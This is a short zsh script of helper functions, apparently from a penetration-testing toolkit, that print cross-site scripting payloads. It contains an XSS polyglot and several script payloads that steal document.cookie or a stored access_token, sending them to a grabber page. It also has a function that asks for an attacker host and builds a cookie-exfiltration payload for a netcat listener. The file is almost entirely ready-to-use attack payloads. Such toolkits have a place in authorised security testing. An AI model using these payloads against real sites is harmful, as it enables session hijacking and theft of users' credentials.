#!/usr/bin/env zsh

############################################################# 
# qq-enum-web-xss
#############################################################




qq-enum-web-xss-polyglot() {
    echo "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"
}





__XSS_POLY=$(cat << END 

END
)

qq-enum-web-xss-grabber-payloads(){
echo $(cat << END 
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
END
)
}






qq-enum-web-xss-exfil-cookie-netcat() {
    local l && read "l?LHOST: "
    __warn "Start a netcat listener on port 80"
    echo "<script> new Image().src=\"http://${l}/page?var=\"+document.cookie; </script>" 
}

